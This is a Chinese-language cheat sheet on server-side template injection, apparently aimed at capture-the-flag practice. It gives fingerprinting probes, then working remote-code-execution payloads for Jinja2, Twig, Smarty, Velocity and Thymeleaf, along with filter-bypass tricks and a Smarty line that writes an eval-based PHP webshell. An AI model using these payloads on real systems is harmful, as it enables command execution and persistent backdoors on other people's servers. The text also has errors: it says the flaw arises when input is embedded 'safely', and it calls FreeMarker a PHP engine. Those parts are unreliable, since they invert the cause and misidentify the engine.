# 服务端模板注入 (SSTI) 漏洞指南

当应用程序将用户输入安全地嵌入到模板引擎中，而不是将其作为数据传递给模板时，就会发生 SSTI。攻击者可以利用模板引擎的语法执行任意代码 (RCE)。

## 1. 发现与指纹识别

- **测试方法**: 在输入点（如 URL 参数、表单字段、甚至是 HTTP Header）输入基础数学运算。
  - 测试 `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`。
- **框架识别**:
  - 如果 `{{7*7}}` 返回 `49`，可能是 Jinja2 (Python), Twig (PHP), Tornado 等。
  - 如果 `{{7*'7'}}` 返回 `7777777`，大概率是 Jinja2 (Python)。
  - 如果 `{{7*'7'}}` 返回 `49`，大概率是 Twig (PHP)。
  - 如果 `${7*7}` 返回 `49`，可能是 FreeMarker (PHP) 或 Java 模板引擎 (如 Thymeleaf, Velocity)。

## 2. Jinja2 / Python 模板注入

Jinja2 是最常见的 SSTI 考点。核心思想是通过 Python 的魔术方法在对象树中“爬行”，找到 `os` 或 `subprocess` 模块并执行系统命令。

**寻找基类与子类**:
- `"".__class__.__mro__[1]` -> 获取 `<class 'object'>`
- `"".__class__.__mro__[1].__subclasses__()` -> 获取所有子类列表。

**通用 Payload 构造**:
你需要编写 Python 脚本自动遍历子类，找到包含 `__builtins__` 或直接是 `<class 'subprocess.Popen'>`, `<class 'os._wrap_close'>` 的类。

*利用 `os._wrap_close`*:
```jinja2
{{ "".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}
```

*利用 `subprocess.Popen`*:
```jinja2
{{ "".__class__.__mro__[1].__subclasses__()[233]('id',shell=True,stdout=-1).communicate()[0].strip() }}
```
*(注意：上面索引 132 和 233 只是示例，不同环境索引不同，必须编写脚本枚举)*

**Jinja2 绕过过滤 (Bypass)**:
- **过滤 `_` (下划线)**: 使用十六进制 `\x5f` 结合 `|attr()`。如 `()|attr('\x5f\x5fclass\x5f\x5f')`。
- **过滤 `.` (点号)**: 使用 `[]` 或 `|attr()`。如 `""['__class__']`。
- **过滤关键字 (如 `os`, `class`)**: 使用字符串拼接 `'cl'+'ass'` 或反转 `'ssalc'[::-1]`。
- **过滤 `{{` 或 `}}`**: 尝试使用 `{% if ... %}` 块，或者盲注。

## 3. Twig (PHP) 模板注入

Twig 环境下 RCE 相对简单。

*基础 Payload*:
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

*Twig 3.x 及以上*:
```twig
{{["id"]|map("system")|join}}
{{["id"]|filter("system")|join}}
```

## 4. Smarty (PHP) 模板注入

Smarty 允许直接调用 PHP 函数或利用 `{if}` 执行代码。

```smarty
{system('ls')}
{if phpinfo()}{/if}
{Smarty_Internal_Write_File::writeFile('shell.php', '<?php eval($_GET[1]); ?>', self::clearConfig())}
```

## 5. Java 模板引擎 (Thymeleaf / Velocity)

- **Velocity**: `#set($ex = "...") $ex.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`
- **Thymeleaf**: Spring Boot 中极常见。Payload 通常形如 `${T(java.lang.Runtime).getRuntime().exec("id")}`。如果被过滤，尝试绕过 EL 表达式限制。